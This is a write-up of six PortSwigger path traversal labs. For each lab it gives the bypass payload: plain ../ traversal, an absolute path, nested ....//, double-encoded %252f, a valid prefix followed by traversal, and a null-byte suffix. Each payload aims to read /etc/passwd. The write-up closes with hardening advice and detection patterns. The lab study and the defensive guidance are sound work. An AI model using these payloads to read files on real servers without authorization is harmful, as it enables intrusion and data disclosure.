# PortSwigger Path Traversal 1-6 — Validate the Canonical Path

This is a consolidated walkthrough of the six PortSwigger path traversal labs.

All labs were solved in the authorized Web Security Academy environment. The durable lesson is that path traversal is a normalization bug: the string being validated is not the path the filesystem ultimately opens.

## 1. Overview

| # | Lab | Broken assumption | Payload |
|---|-----|-------------------|---------|
| 1 | simple case | no filtering | `../../../etc/passwd` |
| 2 | absolute path bypass | blocking `../` is enough | `/etc/passwd` |
| 3 | stripped non-recursively | one replacement pass is enough | `....//....//....//etc/passwd` |
| 4 | superfluous URL-decode | validation before final decode is safe | `..%252f..%252f..%252fetc/passwd` |
| 5 | validation of start of path | string prefix equals directory containment | `/var/www/images/../../../etc/passwd` |
| 6 | extension validation | suffix check survives null-byte truncation | `../../../etc/passwd%00.png` |

## 2. Workflow

```text
Can the filename parameter read outside the image directory?
  try ../

If ../ is blocked:
  try absolute paths
  try nested sequences that survive one strip pass
  try URL encoding and double encoding

If a directory prefix is required:
  keep the prefix, then traverse back out

If an extension suffix is required:
  test truncation/null-byte behavior
```

`/etc/passwd` is the standard proof because it is stable and easy to recognize.

## 3. The six bypasses

### Basic traversal

```http
GET /image?filename=../../../etc/passwd
```

The application joins the user-controlled filename with the image directory and lets the filesystem resolve `../`.

### Absolute path bypass

```http
GET /image?filename=/etc/passwd
```

Blocking traversal sequences does not help if absolute paths are accepted.

### Non-recursive stripping

```text
....//....//....//etc/passwd
```

When the filter removes `../` only once, the remaining characters collapse back into traversal sequences.

### Double decoding

```text
..%252f..%252f..%252fetc/passwd
```

Validation runs before the final decode. The application sees a harmless-looking encoded string, then later turns it into `../../../etc/passwd`.

### Prefix validation

```text
/var/www/images/../../../etc/passwd
```

The raw string starts with the expected directory, but the canonical path does not remain inside it.

### Null-byte suffix bypass

```text
../../../etc/passwd%00.png
```

The validation layer sees a `.png` suffix, while the lower file-opening layer truncates at the null byte.

## 4. Defense and detection

Hardening:

- Prefer opaque file IDs mapped to server-side allowlists.
- If paths are unavoidable, decode and normalize once before validation.
- Resolve the canonical path with `realpath` or an equivalent API.
- Verify that the canonical path is inside the intended base directory.
- Reject absolute paths, mixed separators, encoded separators, null bytes, drive letters, and UNC-style paths.
- Do not rely on raw string `startsWith` or `endsWith` checks.
- Keep the web process from reading sensitive OS files.

Detection ideas:

- `filename`, `path`, `file`, `image`, or `avatar` parameters containing `../`, `..\\`, `%2e`, `%2f`, `%5c`, or `%00`.
- Nested traversal strings such as `....//`.
- Double-encoded separators such as `%252f`.
- Valid directory prefixes followed by traversal segments.
- Image endpoints returning text that looks like `/etc/passwd`.
- File read errors disclosing local filesystem paths.

No lab in this series required Collaborator/OAST. The key defensive rule is to validate the canonical path, not the user-supplied string.
